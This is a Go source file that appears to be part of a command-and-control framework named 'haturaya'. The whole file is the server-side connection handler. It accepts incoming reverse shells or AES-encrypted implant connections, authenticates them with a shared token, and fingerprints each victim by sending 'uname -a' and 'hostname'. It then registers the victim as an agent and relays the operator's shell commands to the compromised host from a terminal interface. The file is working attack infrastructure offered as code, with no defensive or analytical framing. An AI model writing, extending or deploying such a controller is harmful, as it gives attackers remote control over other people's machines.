package c2

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	"haturaya/internal/agent"
	hcrypto "haturaya/internal/crypto"
	"haturaya/internal/tui"
)

// HandleConn processes a single incoming TCP connection:
//  1. Attempts to detect an encrypted agent via length-prefixed AES-GCM auth.
//  2. Falls back to raw reverse-shell mode, probing OS and hostname.
//  3. Registers the agent and notifies the TUI program.
//  4. Bridges operator commands from CmdChan to the connection.
func HandleConn(conn net.Conn, ciph *hcrypto.Cipher, reg *agent.Registry, prog *tea.Program) {
	addr, ok := conn.RemoteAddr().(*net.TCPAddr)
	ip := "unknown"
	if ok {
		ip = addr.IP.String()
	}

	mode := agent.ModeRaw
	osInfo := "Unknown"
	hostname := "Unknown"

	// ── Phase 1: peek for encrypted agent handshake ──────────────────────────
	conn.SetDeadline(time.Now().Add(2 * time.Second))
	peek := make([]byte, 4)
	n, peekErr := conn.Read(peek)
	conn.SetDeadline(time.Time{})

	if peekErr == nil && n == 4 {
		msgLen := binary.BigEndian.Uint32(peek)
		if msgLen > 0 && msgLen < 4096 {
			encPayload := make([]byte, msgLen)
			conn.SetDeadline(time.Now().Add(2 * time.Second))
			_, readErr := readFull(conn, encPayload)
			conn.SetDeadline(time.Time{})

			if readErr == nil {
				if plain, err := ciph.Decrypt(encPayload); err == nil {
					if bytes.Equal(plain, hcrypto.AuthToken) {
						mode = agent.ModeEncrypted
						// Send HATURAYA_OK_v1
						if err := hcrypto.SendMsg(conn, ciph, hcrypto.AuthResponse); err != nil {
							conn.Close()
							return
						}
						// Query OS info
						conn.SetDeadline(time.Now().Add(8 * time.Second))
						if err := hcrypto.SendMsg(conn, ciph, []byte("uname -a")); err == nil {
							if data, err := hcrypto.RecvMsg(conn, ciph); err == nil {
								s := strings.TrimSpace(string(data))
								if strings.Contains(s, "Linux") {
									osInfo = "Linux"
								} else if strings.Contains(s, "Windows") {
									osInfo = "Windows"
								} else {
									osInfo = firstWord(s)
								}
							}
						}
						// Query hostname
						conn.SetDeadline(time.Now().Add(8 * time.Second))
						if err := hcrypto.SendMsg(conn, ciph, []byte("hostname")); err == nil {
							if data, err := hcrypto.RecvMsg(conn, ciph); err == nil {
								if w := firstWord(string(data)); w != "" {
									hostname = w
								}
							}
						}
						conn.SetDeadline(time.Time{})
					}
				}
			}
		}
	}

	// ── Phase 2: raw mode — probe via shell commands ─────────────────────────
	if mode == agent.ModeRaw {
		conn.SetDeadline(time.Now().Add(5 * time.Second))
		conn.Write([]byte("uname -a\n"))
		resp := drainConn(conn, 5*time.Second)
		conn.SetDeadline(time.Time{})

		if strings.Contains(resp, "Linux") {
			osInfo = "Linux"
		} else if strings.Contains(resp, "Windows") {
			osInfo = "Windows"
		}

		conn.SetDeadline(time.Now().Add(5 * time.Second))
		conn.Write([]byte("hostname\n"))
		resp = drainConn(conn, 5*time.Second)
		conn.SetDeadline(time.Time{})

		if w := firstWord(resp); w != "" {
			hostname = w
		}
	}

	// ── Register ─────────────────────────────────────────────────────────────
	id := fmt.Sprintf("%08x", rand.Int63())
	a := &agent.Agent{
		ID:       id,
		Conn:     conn,
		IP:       ip,
		OS:       osInfo,
		Hostname: hostname,
		Mode:     mode,
		Done:     make(chan struct{}),
		CmdChan:  make(chan string, 8),
	}
	reg.Add(a)

	// Notify the TUI.
	prog.Send(tui.AgentConnectedMsg{Agent: a})

	// ── Bridge commands from TUI → agent and output → TUI ────────────────────
	switch mode {
	case agent.ModeEncrypted:
		handleEncrypted(a, ciph, prog)
	default:
		handleRaw(a, prog)
	}

	// Cleanup after the handler exits.
	prog.Send(tui.AgentDisconnectedMsg{ID: a.ID})
	reg.Remove(a.ID)
	conn.Close()
}

// handleEncrypted loops: read cmd from CmdChan → send encrypted → recv response → push to TUI.
func handleEncrypted(a *agent.Agent, ciph *hcrypto.Cipher, prog *tea.Program) {
	for {
		select {
		case <-a.Done:
			return
		case cmd := <-a.CmdChan:
			if err := hcrypto.SendMsg(a.Conn, ciph, []byte(cmd)); err != nil {
				prog.Send(tui.LogMsg{Text: fmt.Sprintf("[!] send error on agent %s: %v", a.ID, err)})
				a.Close()
				return
			}
			resp, err := hcrypto.RecvMsg(a.Conn, ciph)
			if err != nil {
				prog.Send(tui.LogMsg{Text: fmt.Sprintf("[!] recv error on agent %s: %v", a.ID, err)})
				a.Close()
				return
			}
			out := strings.TrimRight(string(resp), "\n")
			prog.Send(tui.AgentOutputMsg{ID: a.ID, Data: out})
		}
	}
}

// handleRaw runs two goroutines: one reads from the connection and sends to TUI,
// the other reads from CmdChan and writes to the connection.
func handleRaw(a *agent.Agent, prog *tea.Program) {
	// Goroutine: connection → TUI.
	readDone := make(chan struct{})
	go func() {
		defer close(readDone)
		buf := make([]byte, 8912)
		for {
			n, err := a.Conn.Read(buf)
			if n > 0 {
				prog.Send(tui.AgentOutputMsg{ID: a.ID, Data: string(buf[:n])})
			}
			if err != nil {
				return
			}
		}
	}()

	// This goroutine: CmdChan → connection (runs in the current goroutine).
	for {
		select {
		case <-a.Done:
			// Kick the read goroutine off its blocking Read.
			a.Conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
			<-readDone
			return
		case <-readDone:
			// Remote side closed.
			a.Close()
			return
		case cmd := <-a.CmdChan:
			if _, err := a.Conn.Write([]byte(cmd + "\n")); err != nil {
				prog.Send(tui.LogMsg{Text: fmt.Sprintf("[!] write error on agent %s: %v", a.ID, err)})
				a.Close()
				a.Conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
				<-readDone
				return
			}
		}
	}
}

// drainConn reads available data from conn until a read deadline fires.
func drainConn(conn net.Conn, timeout time.Duration) string {
	conn.SetDeadline(time.Now().Add(timeout))
	var data []byte
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	return string(data)
}

// readFull reads exactly len(buf) bytes from conn.
func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

// firstWord returns the first whitespace-delimited token of s.
func firstWord(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	parts := strings.Fields(s)
	if len(parts) == 0 {
		return ""
	}
	return parts[0]
}
